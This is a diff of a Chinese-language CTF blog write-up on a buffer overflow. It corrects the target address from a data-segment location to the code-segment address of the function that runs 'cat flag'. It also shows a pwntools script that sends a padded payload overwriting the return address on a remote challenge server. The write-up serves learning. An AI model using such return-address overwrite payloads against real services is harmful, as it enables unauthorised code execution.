@@ -156,7 +156,9 @@
 <p>很显然可以满足。但这里要注意，从<strong>dest</strong>的内存到将<strong>r</strong>覆盖只需要 <strong>0x18</strong> <em>（十进制为24）</em>的长度，而密码长度要大于等于<strong>259</strong>才能满足条件，所以要将<strong>cat flag</strong>的地址写在这<strong>259</strong>位密码的中间，<strong>cat flag</strong>的内存地址占四位，所以要在这个地址之前输入<strong>24</strong>个字符，在这个地址之后输入<strong>231</strong>个字符，同这个地址一起作为密码。  </p>
 <p>确认可以溢出之后，我们来找到包含着<strong>cat flag</strong>这个指令的函数的首地址<em>（shift+f12之后双击cat flag）</em>：  </p>
 <p><img src="image-20200318224327957.png" alt="image-20200318224327957">  </p>
-<p>可以很容易找到<strong>cat flag</strong>所在的函数，<del><strong>08048958</strong></del>即为所求。  </p>
+<p>可以很容易看到<strong>cat flag</strong>，但是，这里并不是要找的地址，因为这里是数据段，而我们要找的是代码段，可以看到，<strong>cat flag</strong>后面有一行浅蓝色的文字，双击这段文字。就可以跳转到代码段：  </p>
+<p><img src="image-20200321155122604.png" alt="image-20200321155122604">   </p>
+<p><del><strong>0804868B</strong></del>即为所求。  </p>
 <hr>
 <h5 id="第四步"><a href="#第四步" class="headerlink" title="第四步"></a>第四步</h5><p><strong>vim 文件名.py</strong>写 <strong>exp</strong> <em>（脚本）</em>：    </p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">p=remote(<span class="string">"111.198.29.45"</span>,<span class="number">34922</span>)</span><br><span class="line">payload=<span class="string">'a'</span>*<span class="number">24</span>+p32(<span class="number">0x0804868B</span>)+<span class="string">'a'</span>*<span class="number">231</span></span><br><span class="line">p.sendlineafter(<span class="string">'choice:'</span>,<span class="string">'1'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'username:'</span>,<span class="string">'hhh'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'passwd:'</span>,payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
